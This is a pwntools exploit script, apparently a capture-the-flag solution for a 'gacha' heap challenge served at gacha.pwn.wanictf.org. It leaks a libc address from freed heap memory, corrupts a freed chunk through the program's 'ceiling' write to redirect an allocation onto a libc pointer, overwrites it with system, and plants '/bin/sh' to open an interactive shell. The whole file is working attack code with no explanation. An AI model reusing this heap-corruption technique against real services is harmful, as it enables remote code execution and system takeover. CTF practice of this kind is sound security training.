from pwn import *

DEBUG = False

IP = "gacha.pwn.wanictf.org"
PORT = 9008
BINPATH = "./pwn08"

if DEBUG:
    context.log_level = "DEBUG"
    p = process(["./ld-2.31.so", BINPATH], env={"LD_PRELOAD":"./libc-2.31.so"})
else:
    p = remote(IP, PORT)

def main():
    p.recvuntil(">")

def gacha(v):
    main()
    p.sendline("1")
    p.sendlineafter(":", str(v))
    p.recvline()
    p.recvline()
    return p.recvline()

def view_history(t):
    main()
    p.sendline("2")
    p.sendlineafter(":", str(t))

def clear():
    main()
    p.sendline("3")

def ceiling(gidx, ridx, val):
    main()
    p.sendline("4")
    p.sendlineafter(">", str(gidx))
    p.sendlineafter(">", str(ridx))
    p.sendlineafter(">", str(val))


gacha(8)
gacha(1024)
gacha(8)
clear()
res = gacha(8).split(" ")
libc_base = int(res[6][1:-1] + res[7][3:-1], 16) - 0x1ebbe0
print("[+] libc base : 0x%x"%libc_base)

libc = ELF("./libc-2.31.so")

fake_chunk = libc_base + 0x1Eeb28
system_addr = libc_base + libc.symbols["system"]
print("[+] fake chunk : 0x%x"%fake_chunk)
print("[+] system : 0x%x"%system_addr)

gacha(8)
gacha(8)
gacha(8)
# auto cleared

gacha(8)
gacha(8)
clear()
ceiling(1, 0, fake_chunk & 0xffffffff)
ceiling(1, 1, (fake_chunk >> 32) & 0xffffffff)

gacha(8)
gacha(8)
gacha(8)
gacha(100)
ceiling(4, 0, system_addr & 0xffffffff)
ceiling(4, 1, (system_addr >> 32) & 0xffffffff)

ceiling(2, 0, u64("/bin/sh\0") & 0xffffffff)
ceiling(2, 1, (u64("/bin/sh\0") >> 32) & 0xffffffff)

if DEBUG :
    gdb.attach(p)


p.interactive() 
